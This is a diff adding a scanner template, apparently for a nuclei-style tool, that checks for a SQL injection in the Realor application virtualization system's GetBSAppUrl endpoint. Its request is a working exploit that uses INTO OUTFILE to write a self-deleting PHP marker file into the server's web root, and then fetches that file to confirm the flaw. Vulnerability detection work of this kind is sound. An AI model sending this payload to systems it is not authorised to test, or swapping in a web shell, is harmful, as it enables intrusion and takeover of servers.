@@ -1,0 +1,27 @@
+id: realor-getbsappurl-sql-inject
+
+info:
+  name: 瑞友应用虚拟化系统 GetBSAppUrl SQL注入
+  author: zan8in
+  severity: high
+  description: |
+    瑞友 应用虚拟化系统 GetBSAppUrl方法存在SQL注入漏洞，由于参数传入没有进行过滤导致存在SQL注入，攻击者通过漏洞可以获取数据库敏感信息
+  tags: realor,sqli
+variables:
+  filename: "{{rand_base(6)}}" 
+
+http:
+  - raw:
+      - |-
+        GET /index.php?s=/Agent/GetBSAppUrl/AppID/')%3bselect+0x3c3f7068706563686f286d6435283129293b756e6c696e6b285f5f46494c455f5f293b3f3e+into+outfile+%27C%3a\\Program+Files+(x86)\\RealFriend\\Rap+Server\\WebRoot\\{{filename}}.php%27%23/123 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+      - |-
+        GET /{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
